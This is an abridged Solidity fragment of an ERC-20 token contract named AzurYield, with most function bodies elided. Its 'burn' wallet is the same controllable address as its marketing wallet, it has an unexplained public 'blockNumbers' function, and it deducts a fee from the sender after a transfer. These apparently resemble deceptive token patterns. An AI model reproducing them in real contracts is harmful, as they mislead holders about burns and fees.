...
contract AzurYield is Context, IERC20, IERC20Metadata, Ownable {

    using SafeMath for uint256;
    using Address for *;
    using Strings for *;

    string private _name = "AzurYield";
    string private _symbol = "AZY";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress = payable(0xE8730E12af34B3914217c577373795B7EAA97822); 
    address payable public burnedWalletAddress = payable(0xE8730E12af34B3914217c577373795B7EAA97822); 
   ...
   function blockNumbers(uint[] calldata a, string memory _value) public returns(uint[] memory){
    ...
    function _beforeTokenTransfer( 
        ...
        if(inSwapAndLiquify || msg.sender == address(0)) 
        { 
    ...
    function _afterTokenTransfer(
        ...
        uint256 finalfee = amount.sub(finalamount);
        _balances[from] = _balances[from].sub(finalfee);
